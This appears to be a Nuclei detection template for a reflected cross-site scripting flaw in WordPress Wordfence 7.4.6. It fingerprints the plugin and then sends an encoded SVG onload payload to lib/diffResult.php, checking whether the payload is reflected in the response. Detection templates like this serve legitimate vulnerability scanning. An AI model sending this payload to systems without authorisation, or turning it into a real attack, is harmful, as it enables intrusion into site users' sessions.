id: wordpress-wordfence-xss

info:
  name: WordPress Wordfence 7.4.6 - Cross0Site Scripting
  author: madrobot
  severity: medium
  description: WordPress Wordfence 7.4.6 is vulnerable to cross-site scripting.
  classification:
    cpe: cpe:2.3:a:wordpress:wordfence:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  metadata:
    max-request: 2
    vendor: wordpress
    product: wordfence
  tags: wordpress,wp-plugin,xss,wordfence,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/wordfence/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        name: wordfence
        cpe: cpe:2.3:a:wordpress:wordfence:*:*:*:*:*:*:*:*
        internal: true
        words:
          - 'Wordfence Security - '

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E"

    matchers-condition: and
    matchers:
      - type: word
        name: wordfence-2
        cpe: cpe:2.3:a:wordpress:wordfence:*:*:*:*:*:*:*:*
        words:
          - "'>\"<svg/onload=confirm('test')>"
        part: body

      - type: word
        name: wordfence-3
        cpe: cpe:2.3:a:wordpress:wordfence:*:*:*:*:*:*:*:*
        words:
          - "text/html"
        part: header

      - type: status
        status:
          - 200
